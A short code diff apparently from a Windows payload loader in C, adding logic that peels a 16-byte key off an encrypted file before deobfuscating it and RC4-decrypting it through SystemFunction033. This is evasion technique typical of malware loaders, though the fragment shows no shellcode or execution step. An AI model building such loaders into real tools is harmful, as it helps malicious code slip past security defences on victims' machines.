@@ -88,26 +88,35 @@ int main(int argc, char* argv[]) {
 
     CloseHandle(hFile);
 
+    printf("[i] size of pbuffer : %ld \n", dwFileSize);
+
+    // Create a buffer of the value of the size KEY_SIZE
+    PBYTE KeySizeBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, KEY_SIZE);
+    if (KeySizeBuffer == NULL) {
+        printf("[!] Failed to allocate memory for KeySizeBuffer.\n");
+        return -1;
+    }
+
+    // Store the first 0x10 bytes of pBuffer into KeySizeBuffer
+    memcpy(KeySizeBuffer, pBuffer, KEY_SIZE);
+
+    // Move the pointer of pBuffer to after 0x10 bytes of the initial position
+    pBuffer += KEY_SIZE;
+    dwFileSize -= KEY_SIZE;
+
+	printf("[i] Encrypted Payload Size : %ld \n", dwFileSize);
+
     // Deobfuscate the Payload
     SIZE_T DeobfuscatedPayloadSize = 0;
     PBYTE DeobfuscatedPayloadBuffer = NULL;
 
     printf("[i] Deobfuscating \"%s\" ... ", argv[1]);
-    if (!Deobfuscate(pBuffer, dwFileSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
+    if (!Deobfuscate(pBuffer, dwFileSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize, KeySizeBuffer)) {
         return -1;
     }
     printf("[+] DONE \n");
     printf("\t>>> Deobfuscated Payload Size : %llu \n\t>>> Deobfuscated Payload Located At : 0x%p \n", (unsigned long long)DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);
 
-    //// Adjust the size to account for the 4-byte difference
-    //if (DeobfuscatedPayloadSize > 4) {
-    //    DeobfuscatedPayloadSize -= 4;
-    //} else {
-    //    printf("[!] Deobfuscated payload size is too small.\n");
-    //    return -1;
-    //}
-
-    // Decrypt the payload
     if (!Rc4EncryptionViSystemFunc033(_key, DeobfuscatedPayloadBuffer, sizeof(_key), DeobfuscatedPayloadSize)) {
         return -1;
     }
